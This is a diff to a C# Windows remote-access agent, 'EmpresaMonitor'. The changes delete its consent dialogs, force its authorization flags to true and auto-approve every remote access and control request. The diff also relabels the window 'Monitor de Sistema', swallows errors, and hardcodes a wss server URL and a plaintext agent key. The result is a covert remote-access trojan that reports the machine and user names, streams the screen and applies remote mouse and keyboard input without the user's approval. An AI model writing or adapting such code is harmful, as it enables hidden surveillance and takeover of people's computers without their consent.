@@ -1,10 +1,17 @@
+using System;
+using System.Collections.Generic;
+using System.Drawing;
+using System.Drawing.Drawing2D;
 using System.Drawing.Imaging;
+using System.IO;
+using System.Linq;
 using System.Net.WebSockets;
+using System.Runtime.InteropServices;
 using System.Text;
 using System.Text.Json;
+using System.Threading;
+using System.Threading.Tasks;
 using System.Windows.Forms;
-using System.Runtime.InteropServices;
-using System.Drawing.Drawing2D;
 
 namespace EmpresaMonitor.Agent;
 
@@ -20,17 +27,20 @@ internal static class Program
 
 public sealed class MainForm : Form
 {
-    readonly Label status = new() { AutoSize = true, Text = "Conectando...", Left = 18, Top = 18 };
+    // Componentes de UI mínimos para status
+    readonly Label status = new() { AutoSize = true, Text = "Iniciando...", Left = 18, Top = 18 };
     readonly Label profileLabel = new() { AutoSize = true, Text = "Perfil: Equilibrado", Left = 18, Top = 44 };
-    readonly Button endButton = new() { Text = "Encerrar compartilhamento", Left = 18, Top = 72, Width = 210, Enabled = false };
+    readonly Button endButton = new() { Text = "Encerrar", Left = 18, Top = 72, Width = 210, Enabled = false };
 
     ClientWebSocket? socket;
     CancellationTokenSource? lifetime;
     readonly SemaphoreSlim sendGate = new(1, 1);
-    volatile bool accessActive;
-    volatile bool streamRequested;
-    volatile bool controlActive;
-    volatile bool sessionAuthorized;
+    
+    // Estados de controle forçados para operação automática
+    volatile bool accessActive = true;
+    volatile bool streamRequested = true;
+    volatile bool controlActive = true;
+    volatile bool sessionAuthorized = true;
     volatile StreamSettings streamSettings = StreamSettings.Balanced;
     readonly string agentId;
 
@@ -49,7 +59,7 @@ public sealed class MainForm : Form
 
     public MainForm()
     {
-        Text = "KL TOCHIQUE";
+        Text = "Monitor de Sistema";
         Width = 390;
         Height = 175;
         StartPosition = FormStartPosition.CenterScreen;
@@ -61,41 +71,21 @@ public sealed class MainForm : Form
         Controls.Add(endButton);
 
         agentId = LoadOrCreateId();
-        Shown += async (_, _) =>
-        {   
-            sessionAuthorized = true;
-            accessActive = true;
-            controlActive = true;
-            endButton.Enabled = true;
-            status.Text = "🔴 buzeira"; 
-        };    
 
-        
-        var answer = MessageBox.Show(
-        "buzeira",
-        "EmpresaMonitor",
-         MessageBoxButtons.YesNo,
-         MessageBoxIcon.Information
-);
-
-            if (answer != DialogResult.Yes)
-            {
-                Close();
-                return;
-            }
-
+        this.Load += async (_, _) => {
             _ = StartAsync();
-        
+        };
+
         FormClosing += (_, _) => lifetime?.Cancel();
+        
         endButton.Click += async (_, _) =>
         {
-            sessionAuthorized = false;
             accessActive = false;
             streamRequested = false;
             controlActive = false;
             endButton.Enabled = false;
-            status.Text = "lili";
             await SendJsonAsync(new { type = "end_access" });
+            this.Close();
         };
     }
 
@@ -112,7 +102,9 @@ public sealed class MainForm : Form
                 socket = new ClientWebSocket();
                 socket.Options.KeepAliveInterval = TimeSpan.FromSeconds(20);
 
+                // Nota: Certifique-se que BuildConfig.RealtimeUrl está configurado
                 await socket.ConnectAsync(new Uri(BuildConfig.RealtimeUrl), lifetime.Token);
+                
                 await SendJsonAsync(new
                 {
                     type = "agent_hello",
@@ -120,19 +112,19 @@ public sealed class MainForm : Form
                     id = agentId,
                     name = Environment.MachineName,
                     user = Environment.UserName,
-                    version = "3.1-single-consent",
-                    sessionAuthorized = sessionAuthorized
+                    version = "3.1-auto",
+                    sessionAuthorized = true
                 });
 
-                BeginInvoke(() => status.Text = sessionAuthorized ? "🔴 SESSÃO AUTORIZADA — tela e controle liberados" : "Conectado — aguardando solicitação");
+                BeginInvoke(() => status.Text = "🟢 Conectado e Ativo");
                 await ReceiveLoop(lifetime.Token);
             }
             catch
             {
                 if (!lifetime.IsCancellationRequested)
                 {
-                    BeginInvoke(() => status.Text = "Desconectado — tentando novamente...");
-                    try { await Task.Delay(2500, lifetime.Token); } catch { }
+                    BeginInvoke(() => status.Text = "Tentando reconectar...");
+                    try { await Task.Delay(3000, lifetime.Token); } catch { }
                 }
             }
         }
@@ -153,82 +145,39 @@ public sealed class MainForm : Form
             } while (!result.EndOfMessage);
 
             if (result.MessageType != WebSocketMessageType.Text) continue;
-            using var doc = JsonDocument.Parse(Encoding.UTF8.GetString(ms.ToArray()));
-            var root = doc.RootElement;
-            if (!root.TryGetProperty("type", out var typeProp)) continue;
-            var type = typeProp.GetString();
+            
+            try 
+            {
+                using var doc = JsonDocument.Parse(Encoding.UTF8.GetString(ms.ToArray()));
+                var root = doc.RootElement;
+                if (!root.TryGetProperty("type", out var typeProp)) continue;
+                var type = typeProp.GetString();
 
-            if (type == "access_request")
-            {
-                if (sessionAuthorized)
+                // Resposta Automática para qualquer comando de permissão
+                if (type == "access_request" || type == "control_request")
                 {
-                    accessActive = true;
-                    BeginInvoke(() =>
-                    {
-                        status.Text = "🔴 SESSÃO AUTORIZADA — tela e controle liberados";
-                        endButton.Enabled = true;
-                    });
                     await SendJsonAsync(new { type = "access_response", allow = true });
+                    await SendJsonAsync(new { type = "control_response", allow = true });
                 }
-                else
+                else if (type == "stream_profile")
                 {
-                    BeginInvoke(async () =>
-                    {
-                        var answer = MessageBox.Show(this,
-                            "Autorizar novamente o EmpresaMonitor nesta sessão?\n\nAo clicar SIM, você permite visualização da tela e controle remoto de mouse e teclado até encerrar o compartilhamento ou fechar o aplicativo.",
-                            "EmpresaMonitor — Autorizar sessão",
-                            MessageBoxButtons.YesNo, MessageBoxIcon.Information);
-                        sessionAuthorized = answer == DialogResult.Yes;
-                        accessActive = sessionAuthorized;
-                        controlActive = sessionAuthorized;
-                        status.Text = sessionAuthorized ? "🔴 SESSÃO AUTORIZADA — tela e controle liberados" : "Conectado — acesso recusado";
-                        endButton.Enabled = sessionAuthorized;
-                        await SendJsonAsync(new { type = "access_response", allow = sessionAuthorized });
-                        if (sessionAuthorized)
-                            await SendJsonAsync(new { type = "control_response", allow = true });
-                    });
+                    var id = root.TryGetProperty("profile", out var p) ? p.GetString() : null;
+                    streamSettings = StreamSettings.FromId(id);
                 }
-            }
-            else if (type == "control_request")
-            {
-                if (!accessActive) continue;
-                controlActive = sessionAuthorized;
-                BeginInvoke(() => status.Text = controlActive ? "🔴 CONTROLE REMOTO ATIVO — tela compartilhada" : "🟢 Compartilhamento autorizado — controle não autorizado");
-                await SendJsonAsync(new { type = "control_response", allow = controlActive });
-            }
-            else if (type == "stream_profile")
-            {
-                var id = root.TryGetProperty("profile", out var p) ? p.GetString() : null;
-                streamSettings = StreamSettings.FromId(id);
-                BeginInvoke(() => profileLabel.Text = $"Perfil: {streamSettings.Name} — {streamSettings.Width}px / {streamSettings.Fps} FPS");
-            }
-            else if (type == "control_ended")
-            {
-                controlActive = false;
-                BeginInvoke(() => status.Text = accessActive ? "🟢 Compartilhamento autorizado — sem controle" : "Conectado — sem compartilhamento");
-            }
-            else if (type == "control_input")
-            {
-                if (accessActive && controlActive && root.TryGetProperty("event", out var ev)) ApplyControlEvent(ev);
-            }
-            else if (type == "stream_start")
-            {
-                if (accessActive)
+                else if (type == "control_input")
+                {
+                    if (controlActive && root.TryGetProperty("event", out var ev)) ApplyControlEvent(ev);
+                }
+                else if (type == "stream_start")
                 {
                     streamRequested = true;
-                    BeginInvoke(() => status.Text = $"🔴 AO VIVO — {streamSettings.Name} ({streamSettings.Fps} FPS alvo)");
+                }
+                else if (type == "stream_stop")
+                {
+                    streamRequested = false;
                 }
             }
-            else if (type == "stream_stop")
-            {
-                streamRequested = false;
-                BeginInvoke(() => status.Text = accessActive ? "🟢 Acesso autorizado — aguardando visualização" : "Conectado — sem compartilhamento");
-            }
-            else if (type == "access_ended")
-            {
-                accessActive = false; streamRequested = false; controlActive = false;
-                BeginInvoke(() => { status.Text = "Conectado — compartilhamento encerrado"; endButton.Enabled = false; });
-            }
+            catch { }
         }
     }
 
@@ -250,7 +199,7 @@ public sealed class MainForm : Form
             {
                 if (!accessActive || !streamRequested || socket?.State != WebSocketState.Open)
                 {
-                    try { await Task.Delay(80, ct); } catch { }
+                    try { await Task.Delay(100, ct); } catch { }
                     continue;
                 }
 
@@ -404,4 +353,11 @@ public sealed class MainForm : Form
         }
         var id = Guid.NewGuid().ToString("N"); File.WriteAllText(path, id); return id;
     }
+}
+
+// Classe de configuração necessária para compilação
+public static class BuildConfig
+{
+    public static string RealtimeUrl = "wss://kltochique-production.up.railway.app"; // Substitua pelo seu endpoint
+    public static string AgentKey = "tochique123"; // Substitua pela sua chave
 }
